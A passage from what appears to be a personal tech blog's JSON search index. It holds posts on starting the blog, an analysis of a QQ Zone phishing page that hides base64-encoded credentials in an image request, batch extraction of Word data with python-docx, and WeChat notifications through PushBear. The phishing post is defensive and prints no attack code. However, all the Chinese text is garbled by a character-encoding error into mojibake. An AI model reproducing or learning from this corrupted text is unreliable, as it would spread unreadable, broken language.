å˜¿å˜¿å˜¿~","path":"2019/07/10/Idea_AutoMeasure/"},{"title":"ç¬¬ä¸€ç¯‡ éšä¾¿å†™å†™","text":"æ¬è¿è‡ªæˆ‘çš„CSDNåšå®¢ è¿™ç¯‡å¯ä»¥ç®—æ˜¯ç¬¬ä¸€æ¬¡å…¬å¼€å‘å‡ºæ¥çš„å§ï¼ˆå…¶å®ä¸¥æ ¼æ¥è¯´ä¹Ÿä¸ç®—å•¦ï¼Œåªæ˜¯ä¹‹å‰å‘çš„å¹´ä»½è¿‡ä¹…ä¼°è®¡éƒ½404æˆ–è€…æ‰¾ä¸åˆ°äº†233 print(\"Hello, everyone!\") Why? ä¸Šäº†å¤§å­¦ä¹‹åï¼Œåšå¤§ä½œä¸šã€å†™è®ºæ–‡ã€å†™æŠ¥å‘Šã€åšé¡¹ç›®ã€å‚åŠ å„ç§æ¯”èµ›ï¼Œç»å¸¸éœ€è¦å„ç§æ‰¾èµ„æ–™ï¼Œå¤§å¤šæ˜¯EEå’ŒCSæ–¹å‘çš„ã€‚ è¿™æ—¶å€™ç»å¸¸å°±é€›åˆ°CSDNã€åšå®¢å›­ã€ç®€ä¹¦ã€é€¼ä¹ä¹‹ç±»çš„è¿™äº›ï¼Œæˆ–è€…å¤§ä½¬ä»¬è‡ªå·±æ­å»ºçš„åšå®¢ï¼Œå½“ç„¶è¿˜æœ‰Bç«™è¿™æ ·æœ‰ç€å„ç§å­¦ä¹ è§†é¢‘çš„å¥½åœ°æ–¹ã€‚ å¤§å®¶éƒ½ä¹äºæŠŠè‡ªå·±çš„ä½“ä¼šå’Œç»éªŒåˆ†äº«å‡ºæ¥ï¼Œå¯¹äºæˆ‘è¿™æ ·çš„èœé¸¡æ¥è¯´å¸®åŠ©å¾ˆå¤§é¸­ã€‚æ¯”å¦‚è¯´ç ç€ç ç€ä»£ç é‡åˆ°å•¥bugäº†ï¼Œç„¶åä¸Šæ¥ä¸€æŸ¥ï¼Œå¾ˆå¤šæ—¶å€™åˆ«äººä¹Ÿé‡åˆ°è¿‡ï¼Œäºæ˜¯ä¹ä»€ä¹ˆæƒ…å†µä¸‹é‡åˆ°çš„ã€å¦‚ä½•è§£å†³çš„å¤§éƒ½æœ‰äº†ï¼Œå¾ˆæ–¹ä¾¿å°±èƒ½è§£å†³é—®é¢˜å‘¢ã€‚ å…¶å®æœ¬æ¥å°±è§‰å¾—å†™ç‚¹ä¸œè¥¿æŒºæœ‰æ„æ€çš„ï¼Œç‰¹åˆ«æ˜¯çœ‹åˆ°èº«è¾¹çš„å°ä¼™ä¼´åœ¨CSDNä¸Šä¹Ÿå¼€äº†è‡ªå·±çš„è´¦å·ï¼Œå¼€å§‹åˆ†äº«è‡ªå·±çš„ä¸€äº› debug ç»å†ä»¥åŠç”Ÿæ´»å¸¸äº‹ï¼Œè¶Šå‘è§‰å¾—æŒºæœ‰æ„æ€çš„ä¹ŸæŒºæœ‰æ„ä¹‰çš„ã€‚äºæ˜¯æˆ‘ä¹Ÿæ¥å†™ä¸€å†™å‘—ã€‚ ç™»å½•çš„æ—¶å€™çªç„¶æ‰å‘ç°ï¼ŒCSDNä¸Šæˆ‘çš„è´¦å·åŸæ¥7å¹´å‰å°±æ³¨å†Œäº†ï¼Œä¼°è®¡ä¹‹å‰è¿˜åªæ˜¯éšä¾¿é€›é€›ä»¥åŠä¸‹è½½äº›èµ„æ–™ï¼Œéƒ½æ²¡æœ‰åœ¨è¿™å„¿å†™è¿‡å•¥ä¸œè¥¿233ã€‚æ²¡äº‹é—®é¢˜ä¸å¤§å“ˆå“ˆå“ˆã€‚ When?å…¶å®ä¹‹å‰æœ‰å•¥å°æƒ³æ³•æˆ–è€…å°åˆ¶ä½œï¼Œéƒ½æ˜¯éšä¾¿å†™ä¸¤å¥è¯è®²è®²åˆ°ç©ºé—´â€¦â€¦å½“ç„¶ï¼Œæœ‰æƒ³æ³• &amp;&amp; æœ‰ç©º çš„æ—¶å€™ï¼Œå°±æ¥è¿™å„¿å†™ç‚¹ä¸œè¥¿å§ï¼ What?å…¶å®æˆ‘æ„Ÿå…´è¶£çš„ä¸œè¥¿æŒºå¤šçš„ emmmæ¯”å¦‚è¯´å¤§ä½“è¯´ä¸€è¯´å˜›ï¼š åµŒå…¥å¼ç›¸å…³ MCUå•ç‰‡æœº FPGA ç‰©è”ç½‘ IoT ESP8266ï¼ˆå‡†å¤‡å¥½å¥½ç ”ç©¶ä¸€æ³¢ï¼Œå¯ä»¥å•ç‹¬åˆ—ä¸€åˆ—ï¼‰ ç¼–ç¨‹ Python ä»¥åŠå„ç§åº“ MATLAB äººå·¥æ™ºèƒ½ AI æœºå™¨å­¦ä¹  Machine Learningï¼ŒML è®¡ç®—æœºè§†è§‰ Computer Visionï¼ŒCV æ•°æ®åˆ†æä¸æŒ–æ˜ æ•°æ®è·å–ï¼ˆå¦‚çˆ¬è™«è™«ï¼‰ æ•°æ®å¯è§†åŒ– æ•°æ®æŒ–æ˜ å¾®ä¿¡å°ç¨‹åºå¼€å‘ å‰ç«¯å°ä¸ªé²œ è§†é¢‘åˆ¶ä½œ etc. å…¶å®å°±æ˜¯å•¥éƒ½æƒ³ç©ä¸€ç©ï¼Œæ„Ÿè§‰èƒ½åšçš„å°±å»å°è¯•å°è¯•ï¼Œç‰¹åˆ«æ˜¯é‚£ç§æ¥è¿‘å®é™…çš„ã€‚äºæ˜¯ä¹å°±æƒ³å†™å•¥å°±å†™å•¥å‘—ã€‚ä¸è¿‡åŸºæœ¬ä¸Šä»¥å°æƒ³æ³•ä¸ºä¸»ï¼Œå°±æ˜¯éšä¾¿è®°å½•ä¸€ä¸‹è¿™æ ·å§ã€‚ å¥½å•¦ç¬¬ä¸€ç¯‡å°±è¿™æ ·éšä¾¿å†™å†™äº†ã€‚æºœå•¦æºœå•¦~","path":"2019/07/09/FirstBlog/"},{"title":"å°æƒ³æ³• | æŸQQç©ºé—´ç›—å·é¡µé¢åˆ†æ","text":"æ¬è¿è‡ªä¹‹å‰çš„å°è„‘æ´å°æƒ³æ³•å•¦ èµ·å› æ˜¨æ™šæœ‰ä¸ªå°ä¼™ä¼´ç©ºé—´é‡ŒæŠŠåˆ—è¡¨éƒ½atäº†ï¼ˆåæ¥çŸ¥é“çš„ï¼‰ï¼Œé™„å¸¦P1è¿™å¼ å›¾ã€‚ ç„¶åæ„Ÿè§‰ä¸å¯¹åŠ²ï¼Œè‚¯å®šæ˜¯è¢«ç›—å·äº†ã€‚ ç„¶åçªç„¶æœ‰ä¸ªè„‘æ´ï¼Œå»çœ‹çœ‹è¿™é‡Œé¢æœ‰å•¥å§ æŠ˜è…¾è®°å½•ç”¨æ‰«ç å·¥å…·ï¼ˆåƒä¸‡åˆ«æ‹¿QQæ¥æ‰«ï¼Œè™½ç„¶è¿™æ¬¡çš„é“¾æ¥æ²¡å•¥å¤§å½±å“ï¼‰å¾—åˆ°äºŒç»´ç æ–‡å­—å†…å®¹ï¼Œå‘ç°æ˜¯ç±»ä¼¼url.cn/...çš„çŸ­é“¾æ¥ã€‚ ç”¨ç”µè„‘æµè§ˆå™¨æ‰“å¼€ï¼ŒåŒæ—¶æ‰“å¼€è°ƒè¯•çª—å£ï¼Œå‘ç°çŸ­é“¾æ¥è·³è½¬åˆ°ä¸€ä¸ªGithub.ioçš„é¡µé¢ï¼ˆP3ï¼‰ï¼Œå¾ˆæ˜æ˜¾æ˜¯GitHub Pagesã€‚ äºæ˜¯å»GitHubä¸ŠæŸ¥æ‰¾è¯¥ç”¨æˆ·ï¼Œå‘ç°åªæœ‰ä¸ªé¡¹ç›®ï¼Œé‡Œé¢å°±åªæœ‰ä¸€ä¸ªindex.htmlæ–‡ä»¶ï¼Œå¯¹åº”ç€P2é¡µé¢ï¼Œæœ€æ–°ç‰ˆæœ¬è¿˜æ˜¯æ˜¨å¤©æäº¤çš„ï¼ˆP4ï¼‰ã€‚ æ„Ÿè§‰ä¸å¯¹ï¼Œäºæ˜¯æ”¹å˜ User Agent ä¸ºæ‰‹æœºï¼Œé‡æ–°è®¿é—®çŸ­é“¾æ¥ï¼Œè·³è½¬P5é¡µé¢ï¼Œæ˜¯ä¸ªä¼ªQQç©ºé—´ç™»å½•ç•Œé¢ï¼Œæœç„¶æ˜¯ä¸ªé’“é±¼é¡µé¢233ã€‚ ç‚¹å‡»ä¸€é”®ç™»å½•ï¼Œå»¶æ—¶ä¸€ä¼šå„¿ä¼šæç¤º è¯·å®‰è£…æœ€æ–°ç‰ˆæœ¬QQ ã€‚ã€å¿˜äº†å¯†ç ã€‘åŠã€æ³¨å†Œæ–°è´¦å·ã€‘éƒ½æ˜¯è·³è½¬åˆ°QQå®˜æ–¹çš„é¡µé¢ã€‚ç„¶åè¾“ä¸ª123456789å•¥çš„æµ‹è¯•ä¸€ä¸‹ï¼Œè¿˜ä¼šæç¤º è¯·è¾“å…¥æ­£ç¡®è´¦å·æˆ–è€…å¯†ç  å•¥çš„ï¼ˆP6ï¼‰ã€‚ ä¹±è¾“ä¸€ä¸ª987321654ï¼Œå™«è¿›å»äº†ï¼Œè·³è½¬åˆ°äº†çœŸçš„QQç©ºé—´ï¼Œè™½ç„¶å¹¶æ²¡æœ‰çœŸçš„ç™»å½•ï¼ˆP7ï¼‰ã€‚ è€Œååœ¨è°ƒè¯•çª—å£networkä¸‹æ‰¾äº†åŠå¤©ï¼Œéƒ½æ²¡å‘ç°æˆ‘æäº¤çš„è´¦å·å¯†ç ã€‚ï¼ˆP8-9ï¼‰ é¡ºç€remote addressæŸ¥ï¼Œå‘ç°å”¯ä¸€æœ‰å¯èƒ½çš„å°±æ˜¯é‚£ä¸ªuser.jpgï¼Œè¿˜å¸¦tokenå‚æ•°ï¼Œéšè—å¾—æœ‰ç‚¹æ„æ€ï¼Œè™½ç„¶ä¸çŸ¥é“ä¸ºå•¥404äº†ã€‚ jioå¾—è¿˜æ²¡å®Œï¼Œè¿™tokenå’‹æ¥çš„ï¼Œæäº¤çš„è´¦å·å¯†ç å»å“ªäº†emmmï¼Œç¼ºç‚¹å•¥ã€‚ç„¶åæŸ¥çœ‹ç½‘é¡µå…ƒç´ ï¼Œæ‰¾åˆ°äº†å¯¹åº”çš„JavaScriptä»£ç ï¼ˆP10-11ï¼‰ã€‚ å“ˆå“ˆå“ˆå“ˆå“ˆè¿™ä¸ªé€»è¾‘åˆ¤æ–­å†™çš„è¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ï¼Œè¿˜æŠŠä¸€å †å¸¸ç”¨ç®€å•æ•°å­—ç»™å¤„ç†äº†ï¼Œéš¾æ€ªå‰é¢è¾“123456789ç©ä¸æ¥ã€‚è¿™ä¸ªä¸€é”®ç™»å½•å°±æ˜¯ä¸ªå‡çš„ï¼ˆä¸‡ä¸€çœŸçš„ä¼°è®¡å°±å¾—ä¸åˆ°è´¦å·å¯†ç äº†å§ï¼‰ã€‚ç‚¹å‡»ç™»å½•çš„æ—¶å€™ï¼Œå°†ç”¨æˆ·åå¯†ç æ‹¼æ¥æˆjsonå­—ç¬¦ä¸²ï¼Œç„¶åå°†å­—ç¬¦ä¸²è½¬æ¢æˆbase64åŠ å¯†ä¼ è¾“ï¼Œè€Œåè·³è½¬åˆ°å®˜æ–¹QQç©ºé—´ç•Œé¢ã€‚å°†P9çš„tokenç”¨base64è§£å¯†ï¼Œæœç„¶å¾—åˆ°äº†è´¦å·å¯†ç ï¼ˆP12ï¼‰ã€‚ // ä»–æ²¡è°ƒç”¨å®˜æ–¹ç™»å½•æ¥å£ï¼Œæ²¡æœ‰çœŸçš„ç™»å½•åˆ°QQç©ºé—´å·²ç»å¾ˆå‹å¥½äº†ï¼Œä¸ç„¶æ›´éš¾å‘ç°å‘¢ åˆ°è¿™å·®ä¸å¤šäº†ï¼Œä½†æ„Ÿè§‰è¿˜æ²¡å®Œï¼Œæˆ‘ä»¬å†æ¥æŸ¥æŸ¥è¿™ä¸ªåŸŸåå§ã€‚ P13-15æ³¨å†Œè€…ä¿¡æ¯ï¼Œè¿™äººæ³¨å†Œçš„åŸŸåçœŸå¤šã€‚ ç”¨é‚®ç®±æŸ¥è¯¢ï¼Œè€Œåéšä¾¿è®¿é—®å‡ ä¸ªï¼ŒP16å‘ç°éƒ½é‡å®šå‘åˆ°äº†ä¸€ä¸ªç›¸ä¼¼é¡µé¢ï¼ŒåŸæ¥é‚£æ˜¯è¥¿éƒ¨æ•°ç ä¸Šçš„ä¸€ä¸ªåŸŸåç»é”€å•†ã€‚è¿™ä¹ˆè¯´é‚£ä¸ªäººä¹Ÿåªæ˜¯ä»ç»é”€å•†é‚£é‡Œä¹°äº†ä¸ªåŸŸåè€Œå·²ã€‚ æ€»ç»“è¿™æ˜¯ä¸ªåšå¾—æœ‰ç‚¹æ°´å¹³çš„é’“é±¼ç½‘ç«™ã€‚ ç¢°åˆ°ç±»ä¼¼çš„äºŒç»´ç åˆ«ä¹±æ‰«ï¼Œæ‰«äº†ä¹Ÿåˆ«ç™»å½•ï¼ è‡³äºè·å–è´¦å·å¯†ç ä¹‹åæŠŠå…¨åˆ—è¡¨éƒ½atï¼Œä¼°è®¡è¿˜å†™äº†åˆ«çš„è„šæœ¬æˆ–è€…è°ƒç”¨äº†å•¥æ¥å£ï¼Œè¿™ä¸ªæˆ‘è¿˜ä¸æ¸…æ¥šemmm ä»¥ä¸Šå†…å®¹å‡åŸºäºå…¬å¼€èµ„æ–™ï¼Œä»…ä¾›å­¦ä¹ ç ”ç©¶ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚","path":"2019/03/30/Idea_AnalysisOfHackingPage/"},{"title":"å°æƒ³æ³• | åˆ©ç”¨python-docxæ‰¹é‡æå–Wordä¸­çš„ä¿¡æ¯è¿›è€Œå¯¼å…¥Excel","text":"æ¬è¿è‡ªä¹‹å‰çš„å°è„‘æ´å°æƒ³æ³•å•¦ åˆæ˜¯ä¸ªå°è„‘æ´æœ€è¿‘æœ‰ä¸ªæ¯”èµ›è¦ç»Ÿè®¡ä¸€ä¸‹å„ç»„ä¿¡æ¯ï¼Œä¿¡æ¯æ¥è‡ªWordç‰ˆçš„ç”³è¯·è¡¨ã€‚ è€ƒè™‘åˆ°Wordè¦ä¸€ä¸ªä¸€ä¸ªæ‰“å¼€ï¼Œå†å¤åˆ¶ç²˜è´´ã€‚ ç®€å•é‡å¤ï¼Œå¤ªéš¾å—äº†8ï¼Œä¸å¦‚å¹²è„†pyä¸€ä¸‹ï¼Œå†™ä¸ªå°ç¨‹åºæ¥å¼„å§ã€‚ å¤§è‡´æ€è·¯ä¸€æŸ¥å‘ç°.docxæ˜¯ä»¥ç±»ä¼¼xmlæ ¼å¼æ¥å­˜æ”¾ä¿¡æ¯çš„ï¼Œåˆšå¼€å§‹æ€è·¯å°±æƒ³ç›´æ¥è§£å‹.docxï¼Œä»ä¸­è§£ææ–‡ä»¶ç„¶åæš´åŠ›åŒ¹é…ã€‚ã€‚ è€Œåå‘ç°æœ‰ä¸ª**ç¬¬ä¸‰æ–¹åº“python-docx**ï¼Œäºæ˜¯ä¹ä¸æƒ³é€ è½®å­äº†ï¼Œç›´æ¥æ‹¿æ¥ç”¨å§ã€‚ ç„¶è€Œå¹¶æ²¡æœ‰é‚£ä¹ˆç®€å•ï¼Œåˆå¹¶çš„å•å…ƒæ ¼å˜æˆç‹¬ç«‹é‡å¤çš„å†…å®¹ï¼ŒåŠ ä¸ªå»é‡å§ã€‚ æå–ä¿¡æ¯æ–‡å­—éƒ½è§£æå‡ºæ¥äº†ï¼Œæ¥ä¸‹æ¥ï¼Œæ¥ç‚¹ç®€å•çš„æ­£åˆ™åŒ¹é…ï¼Œå•ç‹¬æ‹¿ä¸ªæ–‡ä»¶æ¥è¯•è¯•ï¼Œæ²¡æ¯›ç—…ï¼ŒæŒºå¥½çš„ã€‚ æ‰¹é‡è¯»å–éå†æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œç­›é€‰.docxä¸”æ’é™¤ä¸´æ—¶æ–‡ä»¶ï¼Œå™«å°‘äº†ä¿©ã€‚ åŸæ¥è¿˜æœ‰.docæ ¼å¼çš„ï¼Œå¦å­˜ä¸º.docx *(docxåº“åªæ”¯æŒ.docx)*ã€‚ ä¾æ¬¡è¯»å–æ¯ä¸ªæ–‡ä»¶ï¼Œæ‹¼æ¥stringåˆ—è¡¨ï¼Œå¾—åˆ°æ‰€éœ€ä¿¡æ¯ã€‚ å†™å…¥æ–‡ä»¶å°†infolistæŒ‰ç…§.csvçš„æ ¼å¼å†™å…¥æ–‡ä»¶ã€‚ å…¶å®å¯ä»¥è°ƒç”¨ç¬¬ä¸‰æ–¹åº“æ¥å®ç°çš„ã€‚ debugå®é™…æƒ…å†µè¿˜æ˜¯æŒºå¤æ‚çš„ï¼Œæ¯”å¦‚è¡¨æ ¼å“ªé‡Œæ²¡å¡«ç©ºç¼ºäº†ï¼Œæˆ–è€…å“ªä¸ªé‡Œé¢å¤šåŠ å‡ ä¸ªåˆ†éš”ç¬¦ä»€ä¹ˆçš„ï¼Œè¿˜æ˜¯å‡ºäº†ä¸å°‘bugï¼Œäºæ˜¯ç»§ç»­å®Œå–„ç¨‹åºï¼ŒåŠ å…¥ç›¸åº”çš„å¤„ç†å‘—ï¼ ç”Ÿäº§ç¯å¢ƒçœŸå¤æ‚ å¦‚æœç”¨Excelæ‰“å¼€.csvï¼Œå‘ç°å­¦å·å‰çš„0è‡ªåŠ¨ä¸¢å¤±ï¼Œè¿˜æ˜¯è§‰å¾—ä¸çˆ½emmm ï¼ˆç¨‹åºçŒ¿çš„è‡ªæˆ‘ä¿®å…» åˆæŸ¥äº†æŸ¥èµ„æ–™ï¼Œæ–°å»º.xlsxï¼Œä»æ–‡æœ¬å¯¼å…¥åˆ°Excelï¼Œè®¾ç½®å¥½å±æ€§ã€‚ å‡ å¥½ï¼Œå®Œäº‹ï¼ äºæ˜¯ä¹è¾¹æŸ¥èµ„æ–™è¾¹debugè¾¹æ”¹ä»£ç  èŠ±äº†ä¸€ä¸ªå¤šä¸¤ä¸ªå°æ—¶ä¼°è®¡å‡ ä¸ªäººåŒæ—¶æ‰‹åŠ¨åšæ—©éƒ½åšå®Œäº† ï¼ˆå…¶å®æ—©å°±æƒ³è¿‡ç”¨pyè¯»å–Exceläº†ï¼Œä½†æ˜¯ä¸€ç›´è¿˜æ²¡è¯•è¿‡ï¼Œè¿™æ¬¡å°±å…ˆæ‹¿pyè¯»å–Wordè¯•è¯•æ°´å§","path":"2019/03/21/Idea_python-docx/"},{"title":"å°æƒ³æ³• | åŸºäºPushBear APIå®ç°å¾®ä¿¡æ¶ˆæ¯æ¨é€","text":"æ¬è¿è‡ªä¹‹å‰çš„å°æƒ³æ³•å•¦~ è°ƒç”¨APIåŸºäºPushBear APIå®ç°å¾®ä¿¡æ¶ˆæ¯æé†’ PushBear API ç”¨requestsé‡Œç°æˆçš„æ–¹æ³•å°±å®Œäº‹äº†ã€‚ tkinter GUIå°±æ˜¯ç›´æ¥å†™ä»£ç æ„Ÿè§‰æœ‰ç‚¹ä¸å‹å¥½ äºæ˜¯æƒ³åšä¸ªå›¾å½¢ç•Œé¢ åŸºäºPython GUIåº“tkinterç®€å•åšäº†ä¸€ä¸‹ ï¼ˆä»£ç æ‰‹åŠ¨å†™å¸ƒå±€å¤ªéš¾å—äº†ï¼ˆè¿˜æ˜¯ç›´æ¥ç”¨ä»£ç POST/GETæ–¹ä¾¿emmmï¼ˆçªç„¶jioå¾—LabVIEWåšå›¾å½¢ç•Œé¢çœŸæ–¹ä¾¿ å¾®ä¿¡æ¨é€æ•ˆæœ æ‰“å¼€åæ˜¯Markdownæ¸²æŸ“çš„æ•ˆæœå‘¢ï¼ ï¼ˆå®Œï¼‰ 20191221 Updateï¼š å¥½ä¹…æ²¡ç”¨äº†ä¸çŸ¥é“ç°åœ¨è¿˜èƒ½ä¸èƒ½ç”¨äº†233 20200211 Update: âš ï¸ ç›´å‘æœåŠ¡è½¬ä»£å‘çš„é€šçŸ¥ï¼ˆé‡è¦ï¼‰å› å¤šæ¬¡è¢«æ¶æ„ä¸¾æŠ¥ï¼Œä»2019å¹´6æœˆå¼€å§‹ï¼Œåªæä¾›ã€Œå·²ç»å¾®ä¿¡è®¤è¯åçš„æœåŠ¡å·ã€è¿›è¡Œæˆæƒåï¼Œç”¨å…¶è‡ªæœ‰æ¥å£æƒé™ä»£å‘ã€‚ä»£å‘æˆæƒå’Œç»‘å®šæ•™ç¨‹ æœ€è¿‘å¼„å¾®ä¿¡æ¶ˆæ¯æé†’åˆæ¥çœ‹äº†çœ‹ï¼Œå‘ç°ä¸€å¯¹å¤šçš„æ¨é€å¿…é¡»è¦ç»‘å®šå·²è®¤è¯çš„æœåŠ¡å·æ‰èƒ½ä½¿ç”¨äº†ã€‚ ä½†æ˜¯Serveré…±çš„ç»™è‡ªå·±ç»‘å®šçš„å¾®ä¿¡å·æ¨é€æ¶ˆæ¯è¿˜æ˜¯æœ‰æ•ˆçš„ã€‚ è¯¦è§ï¼šhttps://sc.ftqq.com/","path":"2019/03/07/Idea_PushBearAPI_WeChatPush/"}],"categories":[],"tags":[]}